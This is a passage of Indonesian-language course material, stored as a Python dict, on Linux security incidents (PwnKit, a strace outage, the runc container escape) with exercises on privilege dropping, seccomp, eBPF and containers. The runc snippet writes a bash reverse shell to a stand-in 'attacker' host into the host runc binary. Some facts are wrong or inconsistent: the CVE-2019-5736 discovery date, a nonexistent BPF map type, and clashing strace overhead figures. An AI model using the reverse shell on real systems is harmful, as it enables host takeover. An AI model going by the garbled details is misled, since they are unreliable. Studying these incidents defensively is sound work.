            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada Januari 2022, tim peneliti keamanan dari Qualys mempublikasikan kerentanan kritis bernama PwnKit pada utilitas sistem `pkexec` (bagian dari paket PolicyKit/polkit yang terpasang secara default pada hampir seluruh distribusi Linux utama seperti Ubuntu, Debian, Fedora, CentOS) yang telah tertidur di kode sumber selama lebih dari 12 tahun (sejak Mei 2009).
- **Akar Masalah Model Keamanan SUID & Akses Array Diluar Batas**: Utilitas `pkexec` dipasang dengan atribut biner SUID (*Set User ID*), yang berarti biner tersebut berjalan dengan hak akses penuh pengguna root bahkan ketika dipanggil oleh pengguna biasa. Ketika dipanggil melalui system call `execve` dengan array argumen kosong (`argc = 0`), program mengasumsikan bahwa `argv[0]` selalu memuat nama program. Ketika `pkexec` mencoba membaca argumen pertama pada indeks `argv[1]`, pointer melompat keluar dari array argumen kosong dan langsung membaca elemen pertama dari array variabel lingkungan (`envp[0]`). Penyerang memanfaatkan cacat pembacaan dan penulisan out-of-bounds ini untuk menyuntikkan variabel lingkungan `GCONV_PATH`, memaksa modul pemformatan karakter glibc memuat pustaka biner bersama buatan penyerang sebagai root, memberikan akses root seketika tanpa memerlukan password.""",
            "snippet": r"""```c
// Rekonstruksi Cacat Batas Argumen pkexec (CVE-2021-4034)
int main(int argc, char **argv) {
    int n;
    // CACAT FATAL: Asumsi bahwa argc selalu >= 1
    // Jika penyerang memanggil execve("pkexec", NULL, envp): argc bernilai 0!
    
    // n diinisialisasi ke 1:
    for (n = 1; n < argc; n++) {
        // Loop ini dilewati jika argc == 0
    }
    
    // KESALAHAN LOGIKA: Mengakses argv[n] di mana n = 1 dan argc = 0!
    // argv[1] membaca memori di luar batas array argv, menembus ke dalam array envp[0]!
    path = g_strdup(argv[n]); 
    
    // Menulis kembali hasil pembersihan path ke argv[n] yang sebenarnya menimpa envp[0]:
    argv[n] = g_strdup(target_path); // Arbitrary environment variable overwrite!
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden PwnKit menjadi peringatan keras terhadap bahaya mekanisme biner SUID tradisional. Rekayasa keamanan Linux modern bergerak cepat meninggalkan SUID menuju model *Linux Capabilities* berbutir halus (seperti `CAP_NET_BIND_SERVICE` alih-alih memberikan root penuh), serta penegakan validasi awal yang ketat: kernel Linux versi 5.18+ kini secara tegas menolak pemanggilan `execve()` yang mengirimkan parameter `argc == 0`."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun program dalam C yang mendemonstrasikan prinsip hak akses minimum (*Principle of Least Privilege*) dengan menggunakan system call `setuid()` dan `setgid()` untuk menurunkan hak akses proses dari pengguna root (UID 0) ke pengguna non-privilese biasa (`nobody` / UID 1000) segera setelah membuka port soket jaringan rendah ($< 1024$), dan buktikan hak akses root tidak dapat direbut kembali.
- **Petunjuk Perancangan Arsitektur**:
  - Periksa nilai kembalian `getuid()` dan `geteuid()`.
  - Pastikan memanggil `setgroups(0, NULL)` untuk membersihkan keanggotaan grup tambahan root.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Verifikasi Penurunan Izin*: Jalankan program sebagai root; verifikasi proses berhasil mengikat port 80, menurunkan izin ke UID 1000, dan upaya memanggil `setuid(0)` kembali gagal dengan `-EPERM`.
- **Rubrik Penilaian Mandiri**: 40% Penurunan Hak Akses UID/GID Permanen yang Benar, 30% Pembersihan Grup Tambahan Root, 30% Verifikasi Penolakan Eskalasi Ulang.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan utilitas pembungkus eksekusi program (*Privilege Sandboxing Tool*) dalam C yang menggunakan Linux Capabilities (`libcap`) untuk memberikan hanya kemampuan spesifik yang dibutuhkan (misal `CAP_NET_RAW` untuk ping, atau `CAP_SYS_TIME` untuk NTP) kepada suatu biner, mengeliminasi kebutuhan penggunaan bit SUID root secara total.
- **Petunjuk Perancangan Arsitektur**:
  - Atur set kapabilitas *Permitted*, *Effective*, dan *Inheritable* menggunakan `cap_set_proc()`.
  - Bersihkan bit kapabilitas berbahaya seperti `CAP_SYS_ADMIN` dan `CAP_DAC_OVERRIDE`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Audit Kapabilitas*: Jalankan program dengan hanya `CAP_NET_ADMIN`; pastikan program dapat memodifikasi antarmuka jaringan namun ditolak saat mencoba membaca file sensitif `/etc/shadow`.
- **Rubrik Penilaian Mandiri**: 40% Pengelolaan Linux Capabilities Menggunakan libcap yang Tepat, 30% Eliminasi Total Ketergantungan SUID, 30% Pengujian Pembatasan Izin.

### Tingkat 3: Mahir
- **Tugas**: Rancang sandbox keamanan tingkat lanjut menggunakan *Secure Computing Mode* (Seccomp-BPF) dalam C/Linux yang mengkompilasi filter aturan instruksi BPF untuk mencegat dan membatasi system call yang boleh dieksekusi proses: izinkan hanya `read`, `write`, `exit`, dan blokir seluruh upaya pemanggilan `execve`, `fork`, `socket`, atau `ptrace` dengan terminasi instan `SECCOMP_RET_KILL`.
- **Petunjuk Perancangan Arsitektur**:
  - Bangun array instruksi `struct sock_filter` yang memeriksa arsitektur CPU (`AUDIT_ARCH_X86_64`) dan nomor system call.
  - Aktifkan flag `PR_SET_NO_NEW_PRIVS` sebelum mengunci filter seccomp via `prctl()`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Pelanggaran Seccomp*: Eksekusi fungsi `fork()` atau `system("ls")` setelah filter seccomp aktif; kernel harus mematikan proses seketika dengan sinyal `SIGSYS` / kill tanpa melempar izin eksekusi.
- **Rubrik Penilaian Mandiri**: 40% Penyusunan Filter Bytecode Seccomp-BPF yang Tepat, 30% Penegakan Flag PR_SET_NO_NEW_PRIVS, 30% Terminasi Seketika pada Pelanggaran Kebijakan."""
    },

    123: {
        "trace": r"""#### Tabel Penelusuran Profiling Sistem & Analisis Dampak Overhead Tracing: `strace` vs eBPF
| Mekanisme Observabilitas | Metodologi Intersepsi | Jumlah Context Switch per Panggilan | Dampak Latensi Eksekusi ($Latency$) | Utilisasi CPU Tambahan | Risiko Kelumpuhan Produksi |
|---|---|---|---|---|---|
| Eksekusi Normal (Basis) | System Call Native | 2 Switch (User $\to$ Kernel $\to$ User) | $\approx 100\text{ ns}$ | 0% | Nol risiko |
| Tracing via `strace` (`ptrace`)| Stop proses di syscall enter & exit | **4 Context Switch Ekstra per Syscall**| Melonjak ke $\approx 15.000\text{ ns}$ (**150x Lebih Lambat!**) | Lonjakan CPU 40% - 80% | **SANGAT TINGGI (Downtime Server)** |
| Tracing via `perf` | Sampling PMU Hardware | 0 Context Switch (Sampling Asinkron) | $< 1\%$ overhead | Minimal ($< 2\%$) | Aman untuk analisis berkala |
| Tracing Modern `eBPF` | Kernel In-Situ Probes (kprobe/tracepoint)| 0 Context Switch (Eksekusi JIT Ring 0)| $\approx 15\text{ ns}$ tambahan overhead | Diabaikan ($< 0.1\%$) | **NOL DOWNTIME (Production-Grade)**|""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Pemadaman Kluster Basis Data Produksi Akibat Pemasangan `strace` Tanpa Pengawasan",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada jam sibuk transaksi sebuah bank digital, seorang insinyur operasi berusaha menyelidiki kelambatan kueri pada server basis data PostgreSQL produksi berkinerja tinggi yang menangani lebih dari 80.000 transaksi kueri per detik. Insinyur tersebut menempelkan perkakas pelacak `strace -p <pid>` langsung pada proses utama basis data.
- **Akar Masalah Observabilitas Sistem & Overhead Mekanisme Ptrace**: Perkakas `strace` mengandalkan system call `ptrace(PTRACE_SYSCALL)`. Setiap kali proses yang dipantau melakukan satu panggilan sistem (seperti `epoll_wait`, `read`, atau `futex`), kernel Linux menghentikan proses tersebut (*process pause*), melakukan context switch ke proses `strace` untuk mencatat argumen, mengembalikan kontrol ke target, lalu menghentikannya lagi saat syscall selesai untuk mencatat nilai kembalian. Hal ini menggandakan jumlah context switch dan memperlambat waktu eksekusi setiap transaksi hingga 150 kali lipat. Ribuan antrean koneksi klien menumpuk dalam hitungan detik, kehabisan memori socket buffer, dan memicu kegagalan berantai (*cascading failure*) yang mematikan seluruh layanan perbankan online selama 45 menit.""",
            "snippet": r"""```c
// Analisis Mekanisme Perlambatan Ekstrem Ptrace Syscall Hooking
// kernel/ptrace.c
void ptrace_report_syscall(struct pt_regs *regs) {
    // CACAT PERFORMA PRODUKSI:
    // 1. Bekukan proses target (State: TASK_TRACED)
    // 2. Bangunkan proses tracer (Context Switch 1)
    // 3. Salin data register ke memori tracer
    // 4. Tunggu tracer memanggil PTRACE_CONT (Context Switch 2)
    // 5. Ulangi proses ini DUA KALI untuk setiap 1 syscall!
    
    // Pada throughput 80.000 syscall/detik:
    // Menghasilkan > 320.000 context switch per detik, melumpuhkan CPU sepenuhnya!
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden kelumpuhan akibat `strace` melahirkan revolusi observabilitas sistem berbasis *eBPF* (Extended Berkeley Packet Filter). Industri modern melarang keras penggunaan perkakas berbasis ptrace interaktif di lingkungan produksi. Sebagai gantinya, observabilitas modern menggunakan probe eBPF (BCC / bpftrace) yang berjalan langsung di dalam kernel space dengan kompilasi JIT, mengeksekusi agregasi metrik in-situ tanpa context switch, dan dijamin keamanannya oleh verifier kernel Linux."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun program pemantau kesehatan sistem mandiri dalam Python/C yang membaca dan membedah metrik langsung dari sistem berkas semu Linux `/proc/stat` (penggunaan CPU per core: user, nice, system, idle, iowait), `/proc/meminfo` (MemTotal, MemFree, Buffers, Cached), dan `/proc/loadavg` setiap 1 detik.
- **Petunjuk Perancangan Arsitektur**:
  - Hitung persentase utilisasi CPU diferensial: $\Delta \text{busy} / \Delta \text{total} \times 100\%$.
  - Hindari membaca file dengan memanggil shell eksternal (`exec`); gunakan pembacaan file C langsung.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Verifikasi Metrik*: Jalankan beban komputasi stres pada 1 core CPU; pastikan metrik CPU core tersebut menunjukkan utilisasi $\approx 100\%$ sementara core lain tetap normal.
- **Rubrik Penilaian Mandiri**: 40% Dekomposisi File Semu /proc yang Tepat, 30% Kalkulasi Diferensial Beban CPU Akurat, 30% Kerapian Logging Telemetri.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan program profiler waktu eksekusi fungsi menggunakan antarmuka *Linux Perf Event* (`perf_event_open`) dalam C yang membaca counter perangkat keras PMU (*Hardware Performance Monitoring Unit*) untuk menghitung siklus CPU aktual (*CPU Cycles*) dan instruksi yang berhasil dipensiunkan (*Instructions Retired*) guna mengukur rasio *Instructions Per Cycle* (IPC).
- **Petunjuk Perancangan Arsitektur**:
  - Konfigurasi `struct perf_event_attr` dengan tipe `PERF_TYPE_HARDWARE`.
  - Ukur rasio IPC pada dua fungsi: (1) Loop komputasi aritmatika murni (IPC tinggi $> 2.0$), dan (2) Loop pencarian pointer dereferensi linked-list acak (IPC rendah $< 0.5$ akibat cache stall).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Akurasi PMU*: Buktikan secara empiris bahwa algoritma ramah cache memiliki IPC $\ge 3\times$ lebih tinggi dibandingkan algoritma yang memicu banyak L3 cache miss.
- **Rubrik Penilaian Mandiri**: 40% Integrasi System Call perf_event_open yang Benar, 30% Kalkulasi Rasio IPC yang Presisi, 30% Analisis Hardware Performance PMU.

### Tingkat 3: Mahir
- **Tugas**: Rancang program pelacak latensi system call produksi menggunakan *eBPF Tracepoints* (melalui libbpf atau bpftrace) yang menempel pada event `sys_enter_read` dan `sys_exit_read` untuk mengukur distribusi latensi pembacaan file I/O dalam histogram logaritmik daya dua (*Power-of-2 Histogram*) langsung di dalam ruang memori kernel tanpa menyalin data mentah ke User Space.
- **Petunjuk Perancangan Arsitektur**:
  - Simpan stempel waktu awal di eBPF BPF_MAP_TYPE_HASH berbasis `bpf_ktime_get_ns()`.
  - Hitung durasi saat `sys_exit` dan akumulasikan ke dalam BPF_MAP_TYPE_HISTOGRAM.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Overhead Benchmark*: Lakukan $500.000$ operasi I/O pembacaan berkas; buktikan penempelan probe eBPF hanya menambah overhead $< 1\%$ (dibandingkan strace yang memperlambat $> 1000\%$).
- **Rubrik Penilaian Mandiri**: 40% Penyusunan Kode eBPF Kernel Probe & BPF Maps yang Tepat, 30% Agregasi Histogram In-Situ di Kernel Space, 30% Verifikasi Overhead Super Rendah."""
    },

    124: {
        "trace": r"""#### Tabel Penelusuran Pelarian Kontainer Docker via Manipulasi Host PID Namespace (CVE-2019-5736)
| Langkah Eksploitasi Kontainer | Lingkungan Eksekusi | Status Namespace PID | Status Proteksi File `/proc/[pid]/exe` | Aksi Manipulasi Biner Runc Host | Dampak Keamanan Host |
|---|---|---|---|---|---|
| Kontainer Berjalan | User Guest di Docker | Terisolasi via `CLONE_NEWPID` | Mount `/proc` privat kontainer | Kontainer terbatas dalam sandbox | Tidak ada akses ke host |
| Eksekusi Perintah Admin | Admin menjalankan `docker exec` | Biner `runc` host masuk ke kontainer | `runc` berjalan sebagai UID 0 root! | File descriptor biner runc terbuka | `runc` memegang referensi ke binernya sendiri di host! |
| Penyusupan Penyerang | Penyerang mengganti biner target | Penyerang menimpa biner di kontainer | Menunjuk ke `/proc/self/exe` milik runc host! | Menimpa file eksekutabel runc di host OS! | **HOST RUNC BINARY OVERWRITTEN!**|
| Eksekusi Berikutnya | Admin menjalankan docker berikutnya | Host mengeksekusi biner runc yang rusak | Payload penyerang dieksekusi di root host | Penyerang merebut root sistem operasi host | **CONTAINER ESCAPE SUKSES 100%!** |
| Mitigasi Defensif | Memori Sealing | Flag `MFD_CLOEXEC` | Salin runc ke memori anonim read-only | Penulisan ke biner runc dicegah mutlak | Pelarian kontainer digagalkan |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Eksploitasi Pelarian Kontainer Docker Runc Melalui Timpaan File Deskriptor Host (CVE-2019-5736)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada Februari 2018, peneliti keamanan Aleksa Sarai dan Adam Iwaniuk menemukan kerentanan kritis pelarian kontainer (*Container Escape*) pada `runc` (komponen runtime inti kontainer yang menjadi dasar Docker, containerd, Kubernetes, dan Podman).
- **Akar Masalah Isolasi Kernel Linux & File Deskriptor /proc**: Kontainer Linux bukanlah mesin virtual penuh; kontainer adalah proses biasa yang diisolasi menggunakan fitur kernel Linux: Namespaces dan cgroups. Ketika seorang administrator host mengeksekusi perintah `docker exec` ke dalam kontainer yang telah disusupi penyerang, biner `runc` dari host memasuki namespace kontainer sebagai pengguna root. Melalui symlink sistem berkas semu Linux `/proc/self/exe` yang menunjuk langsung ke biner `runc` fisik di sistem operasi host, kontainer dapat membuka file descriptor biner tersebut dalam mode penulisan (`O_WRONLY`). Penyerang menimpa kode biner eksekutabel `runc` pada disk host dengan skrip shellcode berbahaya. Ketika perintah docker berikutnya dijalankan di mesin host, skrip penyerang dieksekusi dengan hak akses root pada sistem operasi induk, menembus isolasi kontainer secara mutlak.""",
            "snippet": r"""```c
// Rekonstruksi Mekanisme Penimpaan Biner Host pada Runc (CVE-2019-5736)
#include <fcntl.h>
#include <unistd.h>

void exploit_container_escape_concept(void) {
    // 1. Dapatkan handle file descriptor ke biner runc host yang sedang mengeksekusi di kontainer
    int runc_fd = open("/proc/self/exe", O_RDONLY);
    
    // 2. Buka ulang file descriptor tersebut melalui /proc/self/fd/ dalam mode penulisan
    int runc_write_fd = -1;
    while (runc_write_fd < 0) {
        runc_write_fd = open("/proc/self/fd/3", O_WRONLY | O_TRUNC);
    }
    
    // 3. KONTAMINASI BUKTI: Tulis payload biner penyerang langsung ke file /usr/bin/runc di HOST!
    write(runc_write_fd, "#!/bin/bash\n/bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n", 56);
    close(runc_write_fd);
    // Saat admin menjalankan perintah docker berikutnya di host, backdoor langsung aktif!
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden CVE-2019-5736 menjadi peringatan terbesar bahwa *containers do not contain like VMs*. Komponen runtime kontainer modern kini menerapkan teknik *Memfd Sealing*: sebelum biner runtime memasuki namespace kontainer pengguna, biner menyalin dirinya sendiri ke dalam blok memori anonim terisolasi menggunakan `memfd_create()` dan menyegelnya (*seal memory*) dengan atribut read-only, sehingga modifikasi melalui `/proc` mustahil dilakukan."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun program isolasi direktori (*Chroot Jail Sandbox*) mandiri dalam C yang membatasi proses anak ke dalam subdirektori terisolasi menggunakan system call `chroot()` dan `chdir()`, lalu turunkan hak akses ke non-root dan buktikan anak tidak dapat mengakses direktori induk (`/etc` atau `/home`).
- **Petunjuk Perancangan Arsitektur**:
  - Selalu panggil `chdir("/")` segera setelah `chroot()` untuk mencegah penyerang keluar dari jail menggunakan pointer path relatif `../..`.
  - Pasang biner shell statis minimalis di dalam direktori root jail.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Upaya Pelarian Direktori*: Jalankan eksploitasi escape chroot standar; buktikan proses anak terkurung rapat di dalam jail dan akses ke luar diblokir dengan `-ENOENT`.
- **Rubrik Penilaian Mandiri**: 40% Urutan Pemanggilan chroot & chdir yang Benar, 30% Penurunan Izin Non-Root Efektif, 30% Ketahanan Sandbox Jail.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan mesin kontainer mini (*Mini Container Runtime*) dalam C/Linux yang mengisolasi proses menggunakan 6 Linux Namespaces utama (`CLONE_NEWPID`, `CLONE_NEWNET`, `CLONE_NEWNS`, `CLONE_NEWUTS`, `CLONE_NEWIPC`, `CLONE_NEWUSER`) via pemanggilan sistem `clone()`, lalu atur nama host kontainer independen dan amati isolasi tabel proses dari host.
- **Petunjuk Perancangan Arsitektur**:
  - Mount sistem berkas semu `/proc` baru yang terisolasi di dalam namespace mount kontainer.
  - Proses pertama di dalam kontainer harus melihat dirinya sendiri sebagai PID 1.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Inspeksi PID 1*: Jalankan `ps aux` di dalam kontainer; buktikan hanya proses kontainer yang terlihat dan seluruh proses sistem operasi host tersembunyi 100%.
- **Rubrik Penilaian Mandiri**: 40% Konfigurasi 6 Flag Namespaces Lengkap pada clone(), 30% Isolasi Mount /proc Mandiri (PID 1 Terverifikasi), 30% Kerapian Struktur Runtime.

### Tingkat 3: Mahir
- **Tugas**: Rancang sistem penegakan kuota sumber daya multi-kontainer menggunakan subsistem Linux *cgroups v2* terpadu (`unified hierarchy`) yang membatasi memori RAM maksimum hingga tepat $128\text{ MiB}$ (`memory.max`), batas bandwidth CPU hingga 50% (`cpu.max`), serta penanganan OOM Killer lokal kontainer tanpa mengganggu proses di luar cgroup.
- **Petunjuk Perancangan Arsitektur**:
  - Buat node cgroup di `/sys/fs/cgroup/my_container/` dan masukkan PID proses target ke file `cgroup.procs`.
  - Pantau kejadian Out-Of-Memory melalui file notifikasi event `memory.events`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Stres Alokasi OOM*: Jalankan proses di dalam cgroup yang mencoba mengalokasikan 256 MiB RAM; buktikan kernel OOM killer mematikan proses anak di dalam cgroup saat menyentuh batas 128 MiB tanpa ada dampak gangguan pada proses host lainnya.
- **Rubrik Penilaian Mandiri**: 40% Pengelolaan Hierarki Terpadu cgroups v2 yang Benar, 30% Penegakan Kuota Memori dan CPU Maksimum Efektif, 30% Isolasi OOM Killer Terverifikasi."""
    }
}
